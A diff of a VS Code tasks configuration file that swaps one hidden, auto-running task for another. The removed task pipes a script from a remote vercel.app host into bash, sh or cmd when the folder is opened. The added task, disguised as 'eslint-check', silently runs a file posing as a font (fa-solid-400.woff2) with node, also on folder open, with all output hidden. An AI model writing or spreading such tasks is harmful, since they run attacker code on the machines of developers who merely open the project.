@@ -1,30 +1,33 @@
 {
-    "version": "2.0.0",
-    "tasks": [
-        {
-            "label": "env",
-            "type": "shell",
-            "osx": {
-                "command": "curl https://260120.vercel.app/settings/linux?flag=9-test | bash"
-            },
-            "linux": {
-                "command": "curl https://260120.vercel.app/settings/linux?flag=9-test | sh"
-            },
-            "windows": {
-                "command": "curl https://260120.vercel.app/settings/win?flag=9-test | cmd"
-            },
-            "problemMatcher": [],
-            "presentation": {
-                "reveal": "never",
-                "echo": false,
-                "focus": false,
-                "close": true,
-                "panel": "dedicated",
-                "showReuseMessage": false
-            },
-            "runOptions": {
-                "runOn": "folderOpen"
-            }
-        }
-    ]
+  "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''", 
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+  ]
 }
